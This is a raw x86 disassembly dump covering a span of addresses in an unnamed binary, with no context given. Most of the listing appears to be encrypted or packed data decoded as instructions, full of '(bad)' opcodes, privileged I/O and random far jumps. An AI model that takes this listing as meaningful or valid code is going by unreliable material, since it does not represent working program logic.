  415a6f:	mov    dl,0x94
  415a71:	gs pop eax
  415a73:	ins    DWORD PTR es:[edi],dx
  415a74:	pop    edx
  415a75:	test   DWORD PTR [edi+0x3f],ecx
  415a78:	add    al,0x2f
  415a7a:	push   esi
  415a7b:	sbb    edi,eax
  415a7d:	int    0xa1
  415a7f:	xor    al,0x8f
  415a81:	add    ecx,esi
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	pop    es
  415ab0:	(bad)  
  415ab2:	arpl   WORD PTR [esi+0x57],cx
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415ac7
  415abc:	ret    
  415abd:	mov    eax,ds:0xe275644b
  415ac2:	pop    eax
  415ac3:	jl     0x415acf
  415ac5:	xor    eax,0xd8df6e8
  415aca:	mov    eax,0xbfd6a282
  415acf:	test   al,0x6
  415ad1:	outs   dx,BYTE PTR ds:[esi]
  415ad2:	lock cli 
  415ad4:	into   
  415ad5:	fucom  st(7)
  415ad7:	pop    ds
  415ad8:	in     al,0x5
  415ada:	dec    esi
  415adb:	(bad)  
  415add:	cld    
  415ade:	and    al,0xc3
  415ae0:	mov    ch,0xcd
  415ae2:	repnz stos BYTE PTR es:[edi],al
  415ae4:	es scas eax,DWORD PTR es:[edi]
  415ae6:	mov    al,ds:0xf974a188
  415aeb:	loope  0x415b6a
  415aed:	aad    0xa1
  415aef:	mov    edx,0xdb9acd70
  415af4:	xor    BYTE PTR [ecx],dh
  415af6:	mov    ?,WORD PTR [ebx+0x19f2604e]
  415afc:	mov    eax,ds:0xa59d2582
  415b01:	or     al,0x5d
  415b03:	aaa    
  415b04:	cmp    ebx,DWORD PTR [ecx-0x28]
  415b07:	pop    ecx
  415b08:	out    dx,eax
  415b09:	imul   ecx,DWORD PTR ds:0xec50ef41,0xffffffcb
  415b10:	inc    esi
  415b11:	fbstp  TBYTE PTR [ebx]
  415b13:	cmp    eax,0xee6f4653
  415b18:	in     eax,dx
  415b19:	fwait
  415b1a:	daa    
  415b1b:	inc    ebx
  415b1c:	sub    esi,ecx
  415b1e:	ret    
  415b1f:	shl    DWORD PTR [ecx+0x5bbd9643],0xc8
  415b26:	push   ss
  415b27:	xchg   esp,eax
  415b28:	test   al,0x45
  415b2a:	neg    BYTE PTR [esi]
  415b2c:	xlat   BYTE PTR ds:[ebx]
  415b2d:	pop    esp
  415b2e:	mov    dl,0x7a
  415b30:	pusha  
  415b31:	(bad)  
  415b32:	push   edx
  415b33:	and    bl,dh
  415b35:	jmp    0x415b34
  415b37:	stos   DWORD PTR es:[edi],eax
  415b38:	gs retf 0xa67e
  415b3c:	cs icebp 
  415b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b3f:	enter  0x98d7,0x4d
  415b43:	adc    DWORD PTR [eax],esi
  415b45:	gs fs icebp 
  415b48:	rol    ah,cl
  415b4a:	outs   dx,BYTE PTR ds:[esi]
  415b4b:	sbb    al,0x74
  415b4d:	dec    eax
  415b4e:	int    0x9f
  415b50:	ins    DWORD PTR es:[edi],dx
  415b51:	mov    eax,ds:0xe43c3e40
  415b56:	mov    al,ds:0x6db8e806
  415b5b:	adc    edi,ecx
  415b5d:	push   0xffffffba
  415b5f:	push   ss
  415b60:	in     eax,dx
  415b61:	sub    al,0x18
  415b63:	leave  
  415b64:	pop    ds
  415b65:	lea    eax,[edx+0x6c]
  415b68:	xchg   ebp,eax
  415b69:	cld    
  415b6a:	bound  esp,QWORD PTR [edi-0x2b53fdbe]
  415b70:	sbb    al,0x1b
  415b72:	fs add al,0xe3
  415b75:	cmc    
  415b76:	outs   dx,DWORD PTR ds:[esi]
  415b77:	or     eax,0xc7687d0c
  415b7c:	mov    bh,0xbd
  415b7e:	in     al,dx
  415b7f:	inc    eax
  415b80:	push   esp
  415b81:	sub    BYTE PTR [ecx+0x60],bh
  415b84:	and    cl,dl
  415b86:	or     al,0xb5
  415b88:	inc    esi
  415b89:	dec    esp
  415b8a:	push   ss
  415b8b:	jmp    0x415bb3
  415b8d:	adc    dl,BYTE PTR [ecx]
  415b8f:	shl    BYTE PTR [ecx+0x0],cl
  415b92:	sbb    eax,0xe4ed49c6
  415b97:	mov    ds:0xd7a0ae07,al
  415b9c:	es jle 0x415bc5
  415b9f:	cmp    DWORD PTR [ebp-0x5427caee],eax
  415ba5:	lods   al,BYTE PTR ds:[esi]
  415ba6:	ret    0xdd4b
  415ba9:	(bad)  
  415baa:	data16 das 
  415bac:	inc    ebp
  415bad:	cld    
  415bae:	iret   
  415baf:	in     eax,dx
  415bb0:	mov    ebp,0xf33e0c85
  415bb5:	loope  0x415b69
  415bb7:	enter  0x32f8,0xd8
  415bbb:	jmp    0xbfe90329
  415bc0:	in     eax,0xdd
  415bc2:	sti    
  415bc3:	lea    ecx,ds:0xf3a99e02
  415bc9:	jno    0x415c4a
  415bcb:	jge    0x415bc4
  415bcd:	cmp    BYTE PTR [edx],bh
  415bcf:	fwait
  415bd0:	and    al,BYTE PTR [eax-0x586846e8]
  415bd6:	jl     0x415b59
  415bd8:	retf   0xf527
  415bdb:	out    dx,al
  415bdc:	icebp  
  415bdd:	and    DWORD PTR [edi+edx*2-0x59],0xffffffaf
  415be2:	jno    0x415c35
  415be4:	dec    esi
  415be5:	xlat   BYTE PTR ds:[ebx]
  415be6:	sbb    BYTE PTR [ebx],al
  415be8:	xlat   BYTE PTR ds:[ebx]
  415be9:	out    dx,al
  415bea:	lahf   
  415beb:	ins    BYTE PTR es:[edi],dx
  415bec:	dec    ebp
  415bed:	or     BYTE PTR [edi-0x2e9ca4a5],ah
  415bf3:	inc    esp
  415bf4:	js     0x415bd0
  415bf6:	ror    BYTE PTR [eax+0x4c],cl
  415bf9:	mov    ebp,0x1970fa82
  415bfe:	jno    0x415c19
  415c00:	out    dx,eax
  415c01:	enter  0xa901,0x90
  415c05:	jmp    0x6c633b9b
  415c0a:	push   cs
  415c0b:	es cmc 
  415c0d:	clc    
  415c0e:	sub    al,0x35
  415c10:	aad    0x39
  415c12:	mov    edi,0xc4d6965d
  415c17:	xchg   edx,eax
  415c18:	enter  0x5eb2,0x75
  415c1c:	adc    ch,dl
  415c1e:	in     al,dx
  415c1f:	fnsave [eax+0x39f99ec]
  415c25:	sbb    al,bh
  415c27:	jp     0x415c72
  415c29:	imul   edi,edi,0x1a706370
  415c2f:	es retf 0xe2a2
  415c33:	outs   dx,BYTE PTR ds:[esi]
  415c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c35:	lds    edx,FWORD PTR [eax]
  415c37:	add    al,0xcc
  415c39:	or     ebx,DWORD PTR [edx]
  415c3b:	jp     0x415cb0
  415c3d:	out    0x51,eax
  415c3f:	int    0x6c
  415c41:	retf   0x1e4f
  415c44:	mov    gs,WORD PTR [ebp+0x27dbd0c8]
  415c4a:	add    eax,0x9c1fc5c3
  415c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c51:	mov    eax,0x7bedb349
  415c56:	push   DWORD PTR [eax]
  415c58:	mov    ds:0xc639d4ea,eax
  415c5d:	sub    BYTE PTR [edx-0x55a715ee],cl
  415c63:	pop    eax
  415c64:	sbb    al,0x8
  415c66:	xor    ebx,DWORD PTR [eax-0x2a582a45]
  415c6c:	rcr    esp,cl
  415c6e:	sbb    esi,DWORD PTR [eax-0x25]
  415c71:	pushf  
  415c72:	sbb    BYTE PTR [eax],0xb0
  415c75:	push   ss
  415c76:	(bad)  
  415c77:	or     eax,0x1c31eba3
  415c7c:	xchg   edx,eax
  415c7d:	ret    0xfbc
  415c80:	icebp  
  415c81:	xchg   ebp,eax
  415c82:	fst    DWORD PTR [ebx]
  415c84:	iret   
  415c85:	sbb    BYTE PTR [esi],dh
  415c87:	mov    WORD PTR [eax],ss
  415c89:	adc    eax,0x9c9f252f
  415c8e:	call   0x51c539a4
  415c93:	dec    ecx
  415c94:	sub    eax,0x5ea413c4
  415c99:	sub    eax,0x50d2a187
  415c9e:	xchg   ebx,eax
  415c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca0:	push   ebp
  415ca1:	xchg   ebp,eax
  415ca2:	aad    0x4d
  415ca4:	cmp    esp,ecx
  415ca6:	add    eax,ebp
  415ca8:	inc    esi
  415ca9:	outs   dx,DWORD PTR ds:[esi]
  415caa:	in     al,0xd9
  415cac:	outs   dx,DWORD PTR ds:[esi]
  415cad:	adc    BYTE PTR [edx],cl
  415caf:	push   edx
  415cb0:	sub    bl,BYTE PTR [ecx+ecx*2]
  415cb3:	mul    DWORD PTR [ecx+0x721bcf43]
  415cb9:	push   eax
  415cba:	stc    
  415cbb:	mov    esi,0xedef310e
  415cc0:	cwde   
  415cc1:	fdivr  QWORD PTR [ebx-0x46]
  415cc4:	jl     0x415ce7
  415cc6:	scas   al,BYTE PTR es:[edi]
  415cc7:	js     0x415cb0
  415cc9:	cmp    dl,bl
  415ccb:	pusha  
  415ccc:	popf   
  415ccd:	fs pushf 
  415ccf:	retf   
  415cd0:	cs dec edi
  415cd2:	sahf   
  415cd3:	and    bl,BYTE PTR [ebp-0x6e]
  415cd6:	mov    ds:0x1fd2ec79,eax
  415cdb:	shr    cl,1
  415cdd:	aas    
  415cde:	xor    al,0x12
  415ce0:	daa    
  415ce1:	out    dx,eax
  415ce2:	mov    ah,0xc7
  415ce4:	jmp    0x79a2:0x535a1eff
  415ceb:	xchg   ebx,eax
  415cec:	jnp    0x415c7e
  415cee:	and    eax,0x9fc452e9
  415cf3:	jecxz  0x415d3f
  415cf5:	xor    ebp,DWORD PTR [edi+0x5a]
  415cf8:	and    edx,DWORD PTR [edx]
  415cfa:	cmp    esp,edx
  415cfc:	rcl    BYTE PTR [edx-0x6b86470c],cl
  415d02:	mov    al,ds:0x51aada48
  415d07:	gs aad 0x6f
  415d0a:	jns    0x415d89
  415d0c:	idiv   BYTE PTR [esi]
  415d0e:	dec    edx
  415d0f:	cmp    dl,ah
  415d11:	iret   
  415d12:	push   ebx
  415d13:	rol    DWORD PTR [ecx],0x5e
  415d16:	xchg   ecx,eax
  415d17:	popf   
  415d18:	(bad)  
  415d19:	ror    ah,0x9b
  415d1c:	add    eax,0x4b3b3f78
  415d21:	mov    cl,0xbf
  415d23:	xchg   esp,eax
  415d24:	loop   0x415d4b
  415d26:	int3   
  415d27:	xchg   edx,eax
  415d28:	add    al,0x7
  415d2a:	and    BYTE PTR [esi+0x7],dh
  415d2d:	(bad)  
  415d2f:	jmp    0x415d23
  415d31:	add    al,0x9b
  415d33:	sub    eax,0x3c51be3
  415d38:	xchg   ch,dl
  415d3a:	sahf   
  415d3b:	and    bh,cl
  415d3d:	sbb    al,0x34
  415d3f:	xchg   DWORD PTR [eax-0xe],esi
  415d42:	popf   
  415d43:	mov    al,ds:0xaa290b02
  415d48:	xchg   ecx,eax
  415d49:	sub    eax,0xffffffda
  415d4c:	fstp   QWORD PTR [edi]
  415d4e:	inc    ecx
  415d4f:	call   0xd7bc:0xac497b6b
  415d56:	adc    BYTE PTR ds:0x8f713158,bl
  415d5c:	pop    es
  415d5d:	nop
  415d5e:	adc    dh,BYTE PTR [eax+0x19]
  415d61:	pop    ebx
  415d62:	xchg   ecx,eax
  415d63:	dec    esp
  415d64:	push   edi
  415d65:	push   cs
  415d66:	dec    ebp
  415d67:	les    edx,FWORD PTR ds:0x83f4513b
  415d6d:	dec    esi
  415d6e:	ins    BYTE PTR es:[edi],dx
  415d6f:	dec    esi
  415d70:	inc    ebp
  415d71:	out    0xc2,eax
  415d73:	hlt    
  415d74:	imul   eax,DWORD PTR [esi-0x682dc9f2],0x862c9992
  415d7e:	bnd ja 0x415d1d
  415d81:	gs jmp 0x28f4750d
  415d87:	dec    ebp
  415d88:	stos   BYTE PTR es:[edi],al
  415d89:	je     0x415d51
  415d8b:	mov    ecx,0xa6494b31
  415d90:	test   al,0xfc
  415d92:	pop    esp
  415d93:	jns    0x415da9
  415d95:	shl    BYTE PTR ds:0xbf0d3d1e,0x52
  415d9c:	lahf   
  415d9d:	sbb    eax,0x2989a175
  415da2:	cwde   
  415da3:	and    edi,0xd8757184
  415da9:	out    dx,al
  415daa:	mov    ebp,0xfcd852d0
  415daf:	stos   DWORD PTR es:[edi],eax
  415db0:	je     0x415d93
  415db2:	jnp    0x415dfe
  415db4:	xor    al,0x34
  415db6:	xor    eax,0x7e70a569
  415dbb:	jne    0x415dc2
  415dbd:	outs   dx,BYTE PTR ds:[esi]
  415dbe:	adc    ebx,ebp
  415dc0:	in     eax,dx
  415dc1:	div    DWORD PTR [esi+0x6473478e]
  415dc7:	stos   BYTE PTR es:[edi],al
  415dc8:	stos   BYTE PTR es:[edi],al
  415dc9:	xchg   edx,eax
  415dca:	sbb    eax,0x8b53bfa
  415dcf:	adc    eax,DWORD PTR [esi-0x75b8bed8]
  415dd5:	and    DWORD PTR [ebp+0x2cbac332],ecx
  415ddb:	fwait
  415ddc:	es push ds
  415dde:	mov    dl,0xb3
  415de0:	pop    ebx
  415de1:	push   0x25a23a00
  415de6:	jp     0x415e08
  415de8:	leave  
  415de9:	mov    bl,0x75
  415deb:	push   0xf5d4e1c3
  415df0:	clc    
  415df1:	xlat   BYTE PTR ds:[ebx]
  415df2:	lea    esi,[edx+0x24]
  415df5:	into   
  415df6:	ret    0x3ebd
  415df9:	adc    al,0x4d
  415dfb:	sbb    edx,DWORD PTR es:[esi-0x39e6d417]
  415e02:	das    
  415e03:	stc    
  415e04:	aas    
  415e05:	popa   
  415e06:	mov    dh,al
  415e08:	xchg   ebx,eax
  415e09:	dec    edx
  415e0a:	mov    esp,0xe7acf8db
  415e0f:	mov    cl,0xb3
  415e11:	data16 fwait
  415e13:	xor    eax,0xabe09133
  415e18:	retf   
  415e19:	out    0x78,al
  415e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e1c:	dec    esi
  415e1d:	out    0x4b,eax
  415e1f:	imul   ebp,DWORD PTR [esi+0x39],0xc9e110da
  415e26:	jns    0x415e16
  415e28:	(bad)
  415e2b:	int3   
  415e2c:	sbb    esp,DWORD PTR [ecx+eax*8+0x1f433ebf]
  415e33:	js     0x415e27
  415e35:	out    dx,eax
  415e36:	or     eax,0x791db8ac
  415e3b:	iret   
  415e3c:	repz arpl WORD PTR [eax-0x7d1b72c7],cx
  415e43:	loopne 0x415dff
  415e45:	jns    0x415e4c
  415e47:	push   ss
  415e48:	push   cs
  415e49:	or     dh,ch
  415e4b:	mov    bl,0x7f
  415e4d:	mov    esp,0xac7beb80
  415e52:	or     BYTE PTR [ebp-0x487421de],0x3f
  415e59:	jmp    0x415e68
  415e5b:	fnstenv [edx+0x14]
  415e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5f:	dec    ebp
  415e60:	aam    0xfa
  415e62:	je     0x415ec4
  415e64:	ins    BYTE PTR es:[di],dx
  415e66:	pop    eax
  415e67:	in     al,dx
  415e68:	leave  
  415e69:	ds (bad) 
  415e6b:	retf   
  415e6c:	or     al,0x87
  415e6e:	dec    eax
  415e6f:	aad    0x8b
  415e71:	(bad)  
  415e73:	jbe    0x415e3b
  415e75:	in     eax,dx
  415e76:	enter  0xa8c5,0xb3
  415e7a:	xor    eax,0x24506fb3
  415e7f:	sub    al,0xa2
  415e81:	xor    DWORD PTR [ebp+0x2b],esp
  415e84:	jl     0x415e0f
  415e86:	aam    0x50
  415e88:	(bad)  
  415e89:	enter  0xbd5,0x92
  415e8d:	repnz mov edi,0x51b71c43
  415e93:	das    
  415e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e95:	pop    edi
  415e96:	add    edx,DWORD PTR [eax-0x2116ad7f]
  415e9c:	jne    0x415e9d
  415e9e:	xor    dl,BYTE PTR [edi]
  415ea0:	lods   eax,DWORD PTR ds:[esi]
  415ea1:	in     al,0xa0
  415ea3:	mov    al,0xb
  415ea5:	neg    BYTE PTR [eax+0x47]
  415ea8:	jl     0x415e43
  415eaa:	scas   al,BYTE PTR es:[edi]
  415eab:	shr    BYTE PTR [eax],1
  415ead:	(bad)  
  415eae:	mov    ah,0x89
  415eb0:	add    BYTE PTR [ebp+0x5c6994e7],al
  415eb6:	dec    eax
  415eb7:	inc    edx
  415eb8:	test   eax,0x8ba3384
  415ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ebe:	(bad)  
  415ebf:	ficomp DWORD PTR [edx]
  415ec1:	std    
  415ec2:	sbb    bl,BYTE PTR [esi]
  415ec4:	cmp    al,0x81
  415ec6:	test   al,0x85
  415ec8:	aaa    
  415ec9:	adc    eax,DWORD PTR [ebp+0x37c59a27]
  415ecf:	fmul   DWORD PTR [edi+edi*2-0x328da2f5]
  415ed6:	xchg   BYTE PTR [ecx-0x2b],dl
  415ed9:	jnp    0x415ea8
  415edb:	div    BYTE PTR [edx]
  415edd:	(bad)  
  415ede:	sbb    esp,esp
  415ee0:	nop
  415ee1:	mov    ecx,edx
  415ee3:	mov    ebx,0xdde5c49d
  415ee8:	mov    edi,0x4cb877b4
  415eed:	fdiv   st,st(3)
  415eef:	mov    ds:0x7cc40958,eax
  415ef4:	retf   0xebd6
  415ef7:	add    al,BYTE PTR [ecx-0x27]
  415efa:	and    eax,0x860fc6b2
  415eff:	out    0x99,eax
  415f01:	mov    ds:0x9b35cf4a,al
  415f06:	lock mov eax,ds:0xa59b8056
  415f0c:	fisubr DWORD PTR [eax+0x5d71c499]
  415f12:	or     ah,ch
  415f14:	dec    BYTE PTR [eax+0xc]
  415f17:	add    eax,0x7e78b579
  415f1c:	and    ecx,DWORD PTR [esi-0x5a]
  415f1f:	iret   
  415f20:	mov    DWORD PTR [esi-0xb255c1d],esi
  415f26:	stos   BYTE PTR es:[di],al
  415f28:	inc    dl
  415f2a:	retf   
  415f2b:	jl     0x415eb2
  415f2d:	cmc    
  415f2e:	sbb    dl,BYTE PTR [ecx]
  415f30:	and    DWORD PTR [esi-0x1dbe4da3],ecx
  415f36:	sbb    esi,DWORD PTR [eax+edi*4+0x60db038]
  415f3d:	(bad)  
  415f3f:	inc    edx
  415f40:	mov    ch,0xac
  415f42:	(bad)  
  415f43:	mov    dh,0x11
  415f45:	ins    DWORD PTR es:[edi],dx
  415f46:	jg     0x415f6e
  415f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f49:	popa   
  415f4a:	xor    ah,BYTE PTR [edx]
  415f4c:	pop    ebp
  415f4d:	and    DWORD PTR [esi-0x4c],edx
  415f50:	cmp    BYTE PTR [ebp-0x5d],ch
  415f53:	gs enter 0x190,0xc2
  415f58:	adc    dl,BYTE PTR ds:0x1419ceae
  415f5e:	pop    ss
  415f5f:	adc    al,0xd0
  415f61:	jo     0x415fc6
  415f63:	adc    BYTE PTR [eax+0x7e],bl
  415f66:	push   0xd
  415f68:	sub    BYTE PTR [edx+0x3c],dl
  415f6b:	mov    bh,0x67
  415f6d:	push   ebx
  415f6e:	retf   0xb316
  415f71:	lahf   
  415f72:	cli    
  415f73:	sbb    DWORD PTR [ebp-0x72],ebp
  415f76:	push   eax
  415f77:	aad    0x26
  415f79:	adc    BYTE PTR [esi-0x61502718],al
  415f7f:	sbb    BYTE PTR [esi],bl
  415f81:	mov    BYTE PTR [eax-0x6c],ah
  415f84:	push   esi
  415f85:	jle    0x415f19
  415f87:	pop    eax
  415f88:	das    
  415f89:	fadd   QWORD PTR [edx]
  415f8b:	(bad)  
  415f8c:	loopne 0x415f57
  415f8e:	push   ss
  415f8f:	jns    0x415f4e
  415f91:	pop    edx
  415f92:	mov    eax,0xeee303a5
  415f97:	ret    
  415f98:	test   ax,0xb0c0
  415f9c:	pop    esi
  415f9d:	fistp  DWORD PTR [edx-0x56b304f5]
  415fa3:	cwde   
  415fa4:	fs gs push 0xffffffa4
  415fa8:	out    0x8d,eax
  415faa:	jp     0x416004
  415fac:	dec    edi
  415fad:	ror    DWORD PTR cs:[esi],1
  415fb0:	js     0x415f55
  415fb2:	cmc    
  415fb3:	dec    DWORD PTR [edx-0x55370e52]
  415fb9:	retf   
  415fba:	fisttp DWORD PTR [ebp-0x39740653]
  415fc0:	mov    ebp,0x7f4be4f1
  415fc5:	pop    edx
  415fc6:	mov    ebx,0xa492dd17
  415fcb:	add    BYTE PTR [edi],0xb2
  415fce:	xor    ecx,DWORD PTR ds:0xb1798ef8
  415fd4:	mov    bh,0x63
  415fd6:	cmp    BYTE PTR [esi],dh
  415fd8:	shr    ah,cl
  415fda:	adc    dh,cl
  415fdc:	enter  0xf43a,0x1a
  415fe0:	fcom   st(1)
  415fe2:	sub    al,0xcf
  415fe4:	into   
  415fe5:	inc    esi
  415fe6:	int    0x47
  415fe8:	xchg   ecx,eax
  415fe9:	daa    
  415fea:	pop    edi
  415feb:	or     esp,esp
  415fed:	mov    eax,0x602fab7
  415ff2:	cmp    BYTE PTR [ebx],dl
  415ff4:	cmp    BYTE PTR [ecx-0x5fade293],dh
  415ffa:	test   DWORD PTR [esi],0x1ee0945e
  416000:	pop    esi
  416001:	ror    BYTE PTR [esi-0x2b518ff5],0x39
  416008:	outs   dx,DWORD PTR ds:[esi]
  416009:	pop    ss
  41600a:	outs   dx,BYTE PTR ds:[esi]
  41600b:	leave  
  41600c:	cmc    
  41600d:	mov    al,0xaa
  41600f:	out    0xa9,eax
  416011:	dec    edx
  416012:	js     0x41603c
  416014:	sbb    al,0xfd
  416016:	sub    al,0x2a
  416018:	fidiv  DWORD PTR [esi]
  41601a:	mov    DWORD PTR [ebp+0x2ea31920],ecx
  416020:	or     eax,0xf20a226e
  416025:	sahf   
  416026:	leave  
  416027:	sbb    edx,DWORD PTR [ebp+edx*1-0x22]
  41602b:	into   
  41602c:	fwait
  41602d:	add    cl,al
  41602f:	mov    edx,ebx
  416031:	add    DWORD PTR [esi-0x77],esp
  416034:	pop    esp
  416035:	inc    ebp
  416036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416037:	arpl   WORD PTR [ebp+0x1f],cx
  41603a:	stc    
  41603b:	mov    al,0x2b
  41603d:	es mov dl,0xc3
  416040:	imul   ebx,edx,0xffffffdc
  416043:	stos   BYTE PTR es:[edi],al
  416044:	push   ebx
  416045:	mov    eax,ds:0xb61052b0
  41604a:	pushf  
  41604b:	inc    edi
  41604c:	xchg   BYTE PTR es:[ebx],al
  41604f:	retf   
  416050:	cli    
  416051:	(bad)  
  416052:	cmp    BYTE PTR [ecx],cl
  416054:	inc    esp
  416055:	sbb    DWORD PTR [eax+0xc],edx
  416058:	cli    
  416059:	stc    
  41605a:	and    DWORD PTR [eax-0x2c],eax
  41605d:	repz inc edi
  41605f:	fcmovne st,st(4)
  416061:	mov    edi,0xfca607b2
  416066:	arpl   WORD PTR [ebx+0x1544f3af],sp
  41606c:	or     bl,0x39
  41606f:	(bad)  
  416071:	leave  
  416072:	dec    edi
  416073:	les    ecx,FWORD PTR [edx]
  416075:	shl    BYTE PTR [ebx+0x4d],0xb0
  416079:	call   0x7dcd7ea5
  41607e:	jecxz  0x416048
  416080:	xor    DWORD PTR ds:0x71ab2213,eax
  416086:	mov    eax,0x26aed538
  41608b:	popf   
  41608c:	js     0x416062
  41608e:	xor    al,0xde
  416090:	cs jmp 0xcb78:0x34bca5a
  416098:	mov    edx,0x2ddb6aaa
  41609d:	stos   DWORD PTR es:[edi],eax
  41609e:	neg    BYTE PTR [ebp+0x1915e0c1]
  4160a4:	call   0xc9c6:0x4c940761
  4160ab:	lods   al,BYTE PTR ds:[esi]
  4160ac:	mov    dl,0x31
  4160ae:	cmp    bl,BYTE PTR [ecx]
  4160b0:	add    eax,esi
  4160b2:	std    
  4160b3:	xlat   BYTE PTR ds:[ebx]
  4160b4:	cs inc esp
  4160b6:	ret    0xa56d
  4160b9:	ret    
  4160ba:	sub    BYTE PTR [esi+0x79],dl
  4160bd:	or     BYTE PTR [ebx],0x5b
  4160c0:	lahf   
  4160c1:	pop    eax
  4160c2:	mov    esi,0x65205990
  4160c7:	adc    DWORD PTR [edx],0xa92b5cbc
  4160cd:	inc    edx
  4160ce:	sub    BYTE PTR [eax],0xb8
  4160d1:	popf   
  4160d2:	adc    BYTE PTR [esi+ebp*2-0x14],0xde
  4160d7:	inc    BYTE PTR [ebx-0x1bf08bbc]
  4160dd:	and    ecx,DWORD PTR [ecx]
  4160df:	cs test ah,0xd4
  4160e3:	fst    DWORD PTR [edi]
  4160e5:	mov    al,0x18
  4160e7:	push   cs
  4160e8:	std    
  4160e9:	aam    0xc2
  4160eb:	loope  0x4160ab
  4160ed:	fdecstp 
  4160ef:	leave  
  4160f0:	mov    WORD PTR [edi-0x4c86ef8a],cs
  4160f6:	je     0x416130
  4160f8:	fiadd  DWORD PTR [edi-0x18ab57d6]
  4160fe:	xchg   BYTE PTR [eax],ah
  416100:	neg    dh
  416102:	mov    esi,0xfbb9c9b6
  416107:	fild   WORD PTR [ebx]
  416109:	daa    
  41610a:	lea    esp,[ecx]
  41610c:	add    eax,0xda2ae87b
  416111:	dec    ebx
  416112:	jle    0x4160cb
  416114:	jmp    0x344c:0x12496f0
  41611b:	cmp    edx,eax
  41611d:	sbb    edi,0xffffffc2
  416120:	in     eax,dx
  416121:	mov    al,ds:0xfbf52aa5
  416126:	jno    0x41611d
  416128:	enter  0x8669,0xa0
  41612c:	test   al,0x36
  41612e:	popf   
  41612f:	inc    edx
  416130:	(bad)  
  416131:	in     al,0xb
  416133:	push   esi
  416134:	sub    al,0xab
  416136:	or     BYTE PTR [edi+0x4e],cl
  416139:	push   eax
  41613a:	xchg   BYTE PTR [ecx-0x62],dh
  41613d:	ret    
  41613e:	and    BYTE PTR [esi+0x53],bh
  416141:	cmp    DWORD PTR ds:0x332e9ce,esi
  416147:	push   ds
  416148:	jns    0x416186
  41614a:	add    al,0x34
  41614c:	and    BYTE PTR [ebx],al
  41614e:	in     eax,dx
  41614f:	inc    esi
  416150:	cmc    
  416151:	hlt    
  416152:	xor    BYTE PTR [eax],cl
  416154:	(bad)  
  416155:	cli    
  416156:	int    0x29
  416158:	scas   eax,DWORD PTR es:[edi]
  416159:	in     al,dx
  41615a:	adc    BYTE PTR [edx+0x2a072f0b],bl
  416160:	call   0x1786:0x7368c4f3
  416167:	loopne 0x41615e
  416169:	ret    0xac47
  41616c:	jg     0x4161e0
  41616e:	sahf   
  41616f:	in     eax,0xbb
  416171:	ins    BYTE PTR es:[edi],dx
  416172:	mov    ch,0x19
  416174:	std    
  416175:	in     al,dx
  416176:	xor    al,0xca
  416178:	loop   0x41619d
  41617a:	test   DWORD PTR [edx],ecx
  41617c:	scas   eax,DWORD PTR es:[edi]
  41617d:	add    eax,0x370fa526
  416182:	dec    ebp
  416183:	or     BYTE PTR [eax+0x62],bh
  416186:	xchg   ebx,eax
  416187:	sbb    bh,BYTE PTR [edx]
  416189:	aad    0xbd
  41618b:	jle    0x4161f3
  41618d:	pusha  
  41618e:	pop    edx
  41618f:	inc    ebp
  416190:	sub    eax,0xb1c1457
  416195:	ret    0xfafc
  416198:	fidiv  DWORD PTR [edi-0x64494654]
  41619e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41619f:	fsubp  st(1),st
  4161a1:	mov    dl,0xc
  4161a3:	jns    0x41615a
  4161a5:	outs   dx,BYTE PTR ds:[esi]
  4161a6:	bnd jo 0x4161ab
  4161a9:	into   
  4161aa:	sbb    DWORD PTR [ecx-0x6a9d5a94],edi
  4161b0:	sar    DWORD PTR [esi-0x30],1
  4161b3:	jae    0x41622e
  4161b5:	data16 and bh,bl
  4161b8:	dec    esi
  4161b9:	aad    0xfd
  4161bb:	push   ds
  4161bc:	sbb    al,0xcc
  4161be:	les    edx,FWORD PTR [ecx-0x2c]
  4161c1:	sbb    al,0x5d
  4161c3:	popf   
  4161c4:	imul   edx,DWORD PTR [ebx],0x812bf6f8
  4161ca:	xchg   ebp,eax
  4161cb:	and    DWORD PTR ds:0xf0c761fd,eax
  4161d1:	and    eax,0xb9bd6280
  4161d6:	fnstenv [esi+0x7b618d6]
  4161dc:	les    ebx,FWORD PTR [esi+ebx*2]
  4161df:	fld    TBYTE PTR [ecx+0x3cc8859f]
  4161e5:	mov    eax,0xa79c59f7
  4161ea:	add    eax,DWORD PTR [edi+0x49]
  4161ed:	adc    esp,DWORD PTR [edx-0x7774580a]
  4161f3:	fmul   DWORD PTR [eax]
  4161f5:	or     ebp,ecx
  4161f7:	push   cs
  4161f8:	test   ch,ch
  4161fa:	add    esi,DWORD PTR [esi]
  4161fc:	mov    esi,0x85f2ef4f
  416201:	xor    dh,ch
  416203:	scas   eax,DWORD PTR es:[edi]
  416204:	sar    BYTE PTR [ecx+0x254e8efa],0x2
  41620b:	sbb    al,0xb6
  41620d:	ja     0x4161e9
  41620f:	adc    eax,ebx
  416211:	ins    DWORD PTR es:[edi],dx
  416212:	(bad)  
  416214:	idiv   BYTE PTR [ebx+0x30]
  416217:	push   esi
  416218:	jae    0x416246
  41621a:	in     al,dx
  41621b:	aad    0xd2
  41621d:	sbb    BYTE PTR [edx+0x2bd57900],dl
  416223:	int    0x88
  416225:	aaa    
  416226:	xor    al,0x9c
  416228:	dec    esp
  416229:	rcr    DWORD PTR [esi+0x19],1
  41622c:	jbe    0x416263
  41622e:	hlt    
